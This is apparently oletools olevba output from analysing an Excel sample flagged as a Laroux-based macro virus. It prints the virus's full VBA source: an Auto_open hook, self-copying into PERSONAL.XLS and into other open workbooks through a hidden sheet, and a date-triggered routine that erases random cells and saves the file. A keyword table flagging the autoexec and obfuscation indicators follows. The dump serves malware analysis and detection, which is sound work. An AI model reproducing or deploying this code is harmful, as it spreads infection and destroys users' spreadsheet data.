olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-557bfba7d16abb9299320bd7768fe50a16ce9b35
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSExcel.Laroux-based-557bfba7d16abb9299320bd7768fe50a16ce9b35 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Dim DD
Dim XX
Sub Auto_open()
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
    Application.OnCalculate = "Calculate"
    Application.OnDoubleClick = "DoubleClick"
    Application.OnTime TimeValue("16:50:00"), "DEL1"
End Sub
Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
Select Case whichfile
    Case 10
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        Sheets("laroux").Visible = True
        Sheets("laroux").Select
        Sheets("laroux").Copy
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        ChDir c4$
        Workbooks(n4$).Sheets("laroux").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "laroux" Then
            Workbooks("PERSONAL.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks(n4$).Sheets("laroux").Visible = False
        Else
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub
Sub DoubleClick()
Attribute DoubleClick.VB_ProcData.VB_Invoke_Func = " \n14"
DD = DD + 1
If DD Mod 99 = 0 Then
DEL1
End If
End Sub
Sub Calculate()
Attribute Calculate.VB_ProcData.VB_Invoke_Func = " \n14"
DD = DD + 1
If DD Mod 99 = 0 Then
DEL1
End If
End Sub
Sub DEL1()
Attribute DEL1.VB_ProcData.VB_Invoke_Func = " \n14"
Application.ScreenUpdating = False
On Error Resume Next
    DA1$ = "20/9/1997"
    If Date > DA1$ Then
        If (Day(Date) Mod 3 = 0) Or (Day(Date) Mod 4 = 0) _
            Or (Day(Date) Mod 7 = 0) Then
            FF = Worksheets.Count
            XX = XX + 1
            If XX > FF Then
                XX = 0
            End If
            Worksheets(XX).Select
            For O = 1 To 10
                RO1 = Int(800 * Rnd()) + 10
                CO1 = Int(20 * Rnd()) + 65
                SS$ = Chr$(CO1) + Mid$(Str$(RO1), Len(Str$(RO1)) - 1)
                Range(SS$).Select
                Selection.ClearContents
                Range("A1").Select
            Next
            AAAA$ = ActiveWorkbook.Path
            If Mid$(AAAA$, 1, 1) = "C" Or Mid$(AAAA$, 1, 1) = "C" Then
                ActiveWorkbook.Save
            Else
            End If
        Else
        End If
    Else
    End If
Application.ScreenUpdating = True
End Sub




-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  larou
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

